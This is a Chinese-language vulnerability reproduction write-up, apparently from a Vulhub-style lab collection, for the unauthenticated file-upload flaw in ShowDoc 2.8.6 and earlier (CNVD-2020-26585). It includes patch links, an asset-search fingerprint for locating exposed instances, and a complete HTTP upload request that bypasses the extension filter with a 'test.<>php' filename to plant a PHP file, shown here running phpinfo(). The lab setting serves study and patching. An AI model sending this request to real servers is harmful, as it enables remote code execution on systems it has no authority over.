# ShowDoc 前台任意文件上传 CNVD-2020-26585

## 漏洞描述

Showdoc 是一个开源的在线共享文档工具。

Showdoc <= 2.8.6 存在 uploadImg 文件上传漏洞，该漏洞源于未正确使用 upload 方法至文件后缀限制失效，攻击者可在未授权的情况下上传任意文件，进而获取服务器权限等。

参考链接：

- https://github.com/star7th/showdoc/pull/1059
- https://github.com/star7th/showdoc/commit/fb77dd4db88dc23f5e570fc95919ee882aca520a
- https://github.com/star7th/showdoc/commit/e1cd02a3f98bb227c0599e7fa6b803ab1097597f

## 漏洞影响

```
Showdoc <= 2.8.6
```

## 网络测绘

```
app="ShowDoc"
```

## 环境搭建

Vulhub 执行如下命令启动一个 ShowDoc 2.8.2 服务器：

```
docker compose up -d
```

服务启动后，安装，初始账号密码 `showdoc/123456`。访问 `http://your-ip:8080` 即可查看到 ShowDoc 的主页。

![](images/ShowDoc%20前台任意文件上传%20CNVD-2020-26585/image-20240603133023021.png)

## 漏洞复现

发送如下请求上传一个 PHP 文件：

```
POST /index.php?s=/home/page/uploadImg HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate, br
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBCbwAmmXaS7UssMW
Content-Length: 216


------WebKitFormBoundaryBCbwAmmXaS7UssMW
Content-Disposition: form-data; name="editormd-image-file"; filename="test.<>php"
Content-Type: text/plain

<?=phpinfo();?>
------WebKitFormBoundaryBCbwAmmXaS7UssMW--
```

PHP 文件路径将返回在数据包中：

![](images/ShowDoc%20前台任意文件上传%20CNVD-2020-26585/image-20240603133735578.png)

访问即可查看到 `phpinfo()` 执行结果：

```
http://your-ip:8080/Public/Uploads/2024-06-03/665d568d2cdd9.php
```

![](images/ShowDoc%20前台任意文件上传%20CNVD-2020-26585/image-20240603133858048.png)
